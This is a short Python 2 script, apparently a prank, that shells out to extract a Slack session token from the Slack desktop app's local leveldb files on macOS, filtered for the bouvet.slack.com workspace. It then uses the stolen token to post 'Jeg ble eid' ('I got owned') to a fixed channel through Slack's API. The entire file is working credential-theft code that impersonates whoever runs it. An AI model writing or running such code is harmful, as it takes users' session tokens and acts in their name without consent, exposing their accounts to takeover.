import urllib2
import os
import subprocess

data = '{"channel": "DAAHPB7HN", "text": "Jeg ble eid :tada:"}'

test = subprocess.check_output("strings $HOME/Library/Application\ Support/Slack/Local\ Storage/leveldb/MANIFEST-000001 |  grep -A1 'bouvet.slack.com' | grep -i 'xox' | tail -1 | cut -d '_' -f 1", shell=True)

url = 'https://slack.com/api/chat.postMessage'

bearer = "Bearer " + test.rstrip()

req = urllib2.Request(url, data, {'Content-Type': 'application/json; charset=utf-8', 'Authorization': bearer})
f = urllib2.urlopen(req)

